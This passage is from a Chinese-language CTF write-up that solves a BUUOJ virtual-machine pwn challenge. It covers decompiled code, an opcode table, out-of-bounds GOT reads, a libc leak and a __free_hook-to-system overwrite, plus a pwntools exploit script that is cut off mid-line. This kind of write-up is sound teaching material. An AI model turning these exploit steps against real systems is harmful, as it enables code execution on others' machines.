class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">execute</span><span class="params">(<span class="type">int</span> opcode)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> desk; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 small; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 middle; <span class="comment">// [rsp+19h] [rbp-7h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 high; <span class="comment">// [rsp+1Ah] [rbp-6h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line">                                                <span class="comment">// 16-20</span></span><br><span class="line">  high = (opcode &amp; <span class="number">0xF0000</span>u) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">  middle = (<span class="type">unsigned</span> __int16)(opcode &amp; <span class="number">0xF00</span>) &gt;&gt; <span class="number">8</span>;<span class="comment">// 8-12</span></span><br><span class="line">  small = opcode &amp; <span class="number">0xF</span>;                         <span class="comment">// 0-3</span></span><br><span class="line">  desk = HIBYTE(opcode);                        <span class="comment">// #define HIBYTE(x) ((x&gt;&gt;24)&amp; 0xff) 25-32</span></span><br><span class="line">  <span class="keyword">if</span> ( HIBYTE(opcode) == <span class="number">0x70</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    desk = (<span class="type">ssize_t</span>)reg;</span><br><span class="line">    reg[high] = reg[small] + reg[middle];       <span class="comment">// //add</span></span><br><span class="line">    <span class="keyword">return</span> desk;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( HIBYTE(opcode) &gt; <span class="number">0x70</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( HIBYTE(opcode) == <span class="number">0xB0</span> )</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      desk = (<span class="type">ssize_t</span>)reg;</span><br><span class="line">      reg[high] = reg[small] ^ reg[middle];</span><br><span class="line">      <span class="keyword">return</span> desk;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( HIBYTE(opcode) &gt; <span class="number">0xB0</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( HIBYTE(opcode) == <span class="number">0xD0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        desk = (<span class="type">ssize_t</span>)reg;</span><br><span class="line">        reg[high] = (<span class="type">int</span>)reg[middle] &gt;&gt; reg[small];</span><br><span class="line">        <span class="keyword">return</span> desk;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( HIBYTE(opcode) &gt; <span class="number">0xD0</span>u )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( HIBYTE(opcode) == <span class="number">0xE0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          running = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !reg[<span class="number">13</span>] )</span><br><span class="line">            <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;EXIT\n&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(opcode) != <span class="number">0xFF</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">return</span> desk;</span><br><span class="line">        &#125;</span><br><span class="line">        running = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;R%d: %X\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i, (<span class="type">unsigned</span> <span class="type">int</span>)reg[i]);</span><br><span class="line">        <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;HALT\n&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(opcode) == <span class="number">0xC0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        desk = (<span class="type">ssize_t</span>)reg;</span><br><span class="line">        reg[high] = reg[middle] &lt;&lt; reg[small];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( HIBYTE(opcode) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x90</span>u:</span><br><span class="line">          desk = (<span class="type">ssize_t</span>)reg;</span><br><span class="line">          reg[high] = reg[small] &amp; reg[middle];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xA0</span>u:</span><br><span class="line">          desk = (<span class="type">ssize_t</span>)reg;</span><br><span class="line">          reg[high] = reg[small] | reg[middle];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x80</span>u:</span><br><span class="line">          desk = (<span class="type">ssize_t</span>)reg;</span><br><span class="line">          reg[high] = reg[middle] - reg[small];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(opcode) == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    desk = (<span class="type">ssize_t</span>)reg;</span><br><span class="line">    reg[high] = memory[reg[small]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(opcode) &gt; <span class="number">0x30</span>u )</span><br></pre></td></tr></table></figure><p>这里把我们输入的int类型（32位）转化为各个相当于寄存器的值，在对这些值根据函数中的逻辑进行编码操作</p><p>这是大概逆向出来的样子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x10: reg[high]=reg[small]  //也就是低八位</span><br><span class="line">0x20: reg[high]=0</span><br><span class="line">0x30: reg[high] = memory[reg[small]]</span><br><span class="line">0x40: memory[reg[small]] = reg[high]</span><br><span class="line">0x50: stack[desk] = reg[high]</span><br><span class="line">0x60: reg[high] = stack[reg[13]]</span><br><span class="line">0x70: reg[high] = reg[small] + reg[middle]</span><br><span class="line">0x80: reg[high] = reg[middle] - reg[small]</span><br><span class="line">0x90: reg[high] = reg[small] &amp; reg[middle]</span><br><span class="line">0xa0: reg[high] = reg[small] | reg[middle]</span><br><span class="line">0xb0: reg[high] = reg[small] ^ reg[middle]</span><br><span class="line">0xc0: reg[high] = reg[middle] &lt;&lt; reg[small]</span><br><span class="line">0xd0: reg[high] = (int)reg[middle] &gt;&gt; reg[small]</span><br><span class="line">0xe0: running = 0 //结束循环</span><br><span class="line">0xff: pritnf(reg[i])（1~15）</span><br></pre></td></tr></table></figure><p>可以数组内部填入负数从而使达到越界访问</p><p>一些逆向中的代码解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> high = (opcode &amp; 0xF0000u) &gt;&gt; 16;                 //16-20</span><br><span class="line"> middle = (unsigned __int16)(opcode &amp; 0xF00) &gt;&gt; 8;// 8-11</span><br><span class="line"> small = opcode &amp; 0xF;                            // 0-3</span><br><span class="line"> desk = HIBYTE(opcode);                           // #define HIBYTE(x) ((x&gt;&gt;24)&amp; 0xff) 24-31</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">reg[high] = (unsigned __int8)opcode;               //这个会把代码截断为低八位</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>那么我们知道了这样的过程怎么进行操作呢</p><p>这题有个关键的数组就是memory数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">got:0000000000201F78 stdout_ptr      dq offset stdout        ; DATA XREF: main+36↑r</span><br><span class="line">.got:0000000000201F80 stdin_ptr       dq offset stdin         ; DATA XREF: main+1F↑r</span><br><span class="line">.got:0000000000201F88 write_ptr       dq offset __imp_write   ; DATA XREF: write↑r</span><br><span class="line">.got:0000000000201F90 setbuf_ptr      dq offset __imp_setbuf  ; DATA XREF: setbuf↑r</span><br><span class="line">.got:0000000000201F98 printf_ptr      dq offset __imp_printf  ; DATA XREF: printf↑r</span><br><span class="line">.got:0000000000201FA0 read_ptr        dq offset __imp_read    ; DATA XREF: read↑r</span><br><span class="line">.got:0000000000201FA8 __libc_start_main_ptr dq offset __imp___libc_start_main</span><br><span class="line">.got:0000000000201FA8                                         ; DATA XREF: __libc_start_main↑r</span><br><span class="line">.got:0000000000201FB0 getchar_ptr     dq offset __imp_getchar ; DATA XREF: getchar↑r</span><br><span class="line">...</span><br><span class="line">bss:0000000000202060 memory </span><br></pre></td></tr></table></figure><ol><li>memory在静态分析中，上面的函数存在got，而我们在execute中可以直接修改这个数组</li><li>我们便可以先把reg的某个地方存放ptr表，就可以把got表打印出来了</li><li>又因为这是2.23，我们可以直接修改函数的free_hook</li><li>我们可以把堆快存放的地址改成free_hook,利用主函数后面的写功能完成这个函数</li><li>接着把free改成system，实现getshell</li></ol><h3 id="EXP的编写"><a href="#EXP的编写" class="headerlink" title="EXP的编写"></a>EXP的编写</h3><p>先算出memory距离stdin_ptr为56个数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">desk,high,middle,small</span>):</span><br><span class="line">    op = desk&lt;&lt;<span class="number">24</span></span><br><span class="line">    op+= high &lt;&lt;<span class="number">16</span></span><br><span class="line">    op+= middle&lt;&lt;<span class="number">8</span></span><br><span class="line">    op+= small</span><br><span class="line">    <span class="keyword">return</span>(<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">56</span>)) <span class="comment">#reg[0]=56</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>))  <span class="comment">#reg[3]=reg[1]-reg[0]=-56</span></span><br><span class="line">sl(opcode(<span class="number">0x30</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">3</span>))  <span class="comment">#reg[7]=memory[-56]</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">55</span>)) <span class="comment">#reg[0]=56</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>))  <span class="comment">#reg[3]=reg[1]-reg[0]=-55</span></span><br><span class="line">sl(opcode(<span class="number">0x30</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">3</span>))  <span class="comment">#reg[8]=memory[-55]</span></span><br></pre></td></tr></table></figure><p>我们算出来偏移，接着我们要把stdin的地址改成__free_hook</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202503161704557.png" alt="image-20250316170403487"></p><p>gdb计算出偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)) <span class="comment">#reg[0]=1</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">12</span>)) <span class="comment">#reg[1]=12</span></span><br><span class="line">sl(opcode(<span class="number">0xc0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>)) <span class="comment">#reg[2]=reg[0]&lt;&lt;reg[1]  --&gt;  1&lt;&lt;12 =0x1000</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x90</span>)) <span class="comment">#reg[0]=0x90</span></span><br><span class="line">sl(opcode(<span class="number">0x70</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">2</span>))  <span class="comment">#reg[10]=reg[0]+reg[2] --&gt;0x1000+0x90=0x1090</span></span><br><span class="line">sl(opcode(<span class="number">0x70</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">10</span>))  <span class="comment">#reg[12]=reg[7]+reg[10] </span></span><br></pre></td></tr></table></figure><p>再把堆快改到对free_hook前面8个字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sl(opcode(0x10,0,0,8))  #reg[0]=8</span><br><span class="line">sl(opcode(0x10,1,0,0))  #reg[1]=0</span><br><span class="line">sl(opcode(0x80,2,1,0))  #reg[2]=reg[1]-reg[0]=-8</span><br><span class="line">sl(opcode(0x40,12,0,2))  #memeory[reg[2]]=reg[12]</span><br><span class="line">sl(opcode(0x70,5,10,12)) #reg[5]=reg[10]+reg[12]</span><br><span class="line">sl(opcode(0x10,0,0,7))  #reg[0]=7sl(opcode(0x10,1,0,0))  #reg[1]=0</span><br><span class="line">sl(opcode(0x80,2,1,0))  #reg[2]=reg[1]-reg[0]=-7</span><br><span class="line">sl(opcode(0x40,11,0,2))  #memeory[reg[2]]=reg[11]</span><br><span class="line">sl(opcode(0xff,0,0,0))</span><br></pre></td></tr></table></figure><p>后面只需算出地址即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;R7:&#x27;</span>)</span><br><span class="line">low=<span class="built_in">int</span>(p.recv(<span class="number">9</span>),<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;low&#x27;</span>,low)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;R11:&#x27;</span>)</span><br><span class="line">high=<span class="built_in">int</span>(p.recv(<span class="number">5</span>),<span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;high&#x27;</span>,high)</span><br><span class="line"></span><br><span class="line">stdin=(high&lt;&lt;<span class="number">32</span>)+low</span><br><span class="line">libc_base=stdin-libc.sym[<span class="string">&#x27;stdin&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">local_file  = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">local_libc  = <span class="string">&#x27;/home/yfy/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;</span></span><br><span class="line">remote_libc = <span class="string">&#x27;/home/yfy/pwn_tools/buu_libc/16-64/libc-2.23.so&#x27;</span></span><br><span class="line">select = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">0</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> select == <span class="number">1</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26749</span>)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = gdb.debug(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> s, num: log.success(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(num)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># 0x10: reg[high]=small  //也就是低八位</span></span><br><span class="line"><span class="comment"># 0x20: reg[high]=0</span></span><br><span class="line"><span class="comment"># 0x30: reg[high] = memory[reg[small]]</span></span><br><span class="line"><span class="comment"># 0x40: memory[reg[small]] = reg[high]</span></span><br><span class="line"><span class="comment"># 0x50: stack[desk] = reg[high]</span></span><br><span class="line"><span class="comment"># 0x60: reg[high] = stack[reg[13]]</span></span><br><span class="line"><span class="comment"># 0x70: reg[high] = reg[small] + reg[middle]</span></span><br><span class="line"><span class="comment"># 0x80: reg[high] = reg[middle] - reg[small]</span></span><br><span class="line"><span class="comment"># 0x90: reg[high] = reg[small] &amp; reg[middle]</span></span><br><span class="line"><span class="comment"># 0xa0: reg[high] = reg[small] | reg[middle]</span></span><br><span class="line"><span class="comment"># 0xb0: reg[high] = reg[small] ^ reg[middle]</span></span><br><span class="line"><span class="comment"># 0xc0: reg[high] = reg[middle] &lt;&lt; reg[small]</span></span><br><span class="line"><span class="comment"># 0xd0: reg[high] = (int)reg[middle] &gt;&gt; reg[small]</span></span><br><span class="line"><span class="comment"># 0xe0: running = 0 //结束循环</span></span><br><span class="line"><span class="comment"># 0xff: pritnf(reg[i])（1~15）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">desk,high,middle,small</span>):</span><br><span class="line">    op = desk&lt;&lt;<span class="number">24</span></span><br><span class="line">    op+= high &lt;&lt;<span class="number">16</span></span><br><span class="line">    op+= middle&lt;&lt;<span class="number">8</span></span><br><span class="line">    op+= small</span><br><span class="line">    <span class="keyword">return</span>(<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;PCPC: &#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;SP: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;CODE SIZE: &#x27;</span>,<span class="built_in">str</span>(<span class="number">21</span>))</span><br><span class="line">rl(<span class="string">&#x27;CODE: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">56</span>)) <span class="comment">#reg[0]=56</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>))  <span class="comment">#reg[3]=reg[1]-reg[0]=-56</span></span><br><span class="line">sl(opcode(<span class="number">0x30</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">3</span>))  <span class="comment">#reg[7]=memory[-56]</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">55</span>)) <span class="comment">#reg[0]=56</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>))  <span class="comment">#reg[3]=reg[1]-reg[0]=-55</span></span><br><span class="line">sl(opcode(<span class="number">0x30</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">3</span>))  <span class="comment">#reg[11]=memory[-55]</span></span><br><span class="line"><span class="comment"># reg[7] reg[8]---&gt;stdin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free_hook-stdin=0x1098-8=0x1090</span></span><br><span class="line"></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)) <span class="comment">#reg[0]=1</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">12</span>)) <span class="comment">#reg[1]=12</span></span><br><span class="line">sl(opcode(<span class="number">0xc0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>)) <span class="comment">#reg[2]=reg[0]&lt;&lt;reg[1]  --&gt;  1&lt;&lt;12 =0x1000</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x90</span>)) <span class="comment">#reg[0]=0x90</span></span><br><span class="line">sl(opcode(<span class="number">0x70</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">2</span>))  <span class="comment">#reg[10]=reg[0]+reg[2] --&gt;0x1000+0x90=0x1090</span></span><br><span class="line">sl(opcode(<span class="number">0x70</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">10</span>))  <span class="comment">#reg[12]=reg[7]+reg[10] </span></span><br><span class="line"></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>))  <span class="comment">#reg[0]=8</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>))  <span class="comment">#reg[1]=0</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>))  <span class="comment">#reg[2]=reg[1]-reg[0]=-8</span></span><br><span class="line">sl(opcode(<span class="number">0x40</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">2</span>))  <span class="comment">#memeory[reg[2]]=reg[12]</span></span><br><span class="line">sl(opcode(<span class="number">0x70</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">12</span>)) <span class="comment">#reg[5]=reg[10]+reg[12]</span></span><br><span class="line">sl(opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>))  <span class="comment">#reg[0]=7sl(opcode(0x10,1,0,0))  #reg[1]=0</span></span><br><span class="line">sl(opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>))  <span class="comment">#reg[2]=reg[1]-reg[0]=-7</span></span><br><span class="line">sl(opcode(<span class="number">0x40</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">2</span>))  <span class="comment">#memeory[reg[2]]=reg[11]</span></span><br><span class="line">sl(opcode(<span class="number">0xff</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">rl(<span class="string">b&#x27;R7:&#x27;</span>)</span><br><span class="line">low=<span class="built_in">int</span>(p.recv(<span class="number">9</span>),<span 